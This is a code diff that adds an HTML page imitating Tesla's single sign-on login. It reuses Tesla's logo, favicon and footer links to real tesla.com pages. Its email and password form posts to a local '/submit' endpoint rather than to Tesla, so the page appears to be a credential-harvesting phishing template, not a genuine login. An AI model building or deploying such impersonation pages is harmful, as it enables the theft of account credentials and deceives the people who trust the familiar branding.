@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Tesla SSO - Sign In</title>
+    <!-- Tesla favicon -->
+    <link rel="icon" type="image/png" href="../static/images/tesla-favicon-logo.png">
+
+
+    <!-- css file -->
+    <link rel="stylesheet" href="../static/sigin.css">
+
+    <!-- font import from google fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
+
+    <!-- Font awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+</head>
+
+<body>
+    <div id="main">
+        <header>
+            <div id="tesla-logo">
+                <img src="../static/images/tesla-seeklogo.png" alt="Tesla Logo">
+            </div>
+            <div id="language-modal">
+                <button><i class="fa-solid fa-globe"></i>en-US</button>
+            </div>
+        </header>
+
+        <div id="container">
+            <form action="/submit" method="POST">
+                <h1>Sign In</h1>
+
+                <div class="form-body">
+                    <div class="input-fields">
+                        <label for="email">Email</label>
+                        <input type="email" id="email" name="email" required>
+                    </div>
+
+                    <div class="input-fields">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" required>
+                    </div>
+
+                    <input type="submit" value="Next" id="submit-button">
+                </div>
+
+                <a href="https://www.tesla.com/support/account-support?redirect=no">Trouble Signing In?</a>
+
+                <div id="or-separator">
+                    <span></span>
+                    <p>Or</p>
+                    <span></span>
+                </div>
+
+                <button type="button" id="create-button">Create Account</button>
+            </form>
+        </div>
+
+        <footer>
+            <a href="https://www.tesla.com/about?redirect=no">Tesla © 2025</a>
+            <a href="https://www.tesla.com/legal/privacy?redirect=no">Privacy & Legal</a>
+            <a href="https://www.tesla.com/contact?redirect=no">Contact</a>
+        </footer>
+    </div>
+</body>
+
+</html>
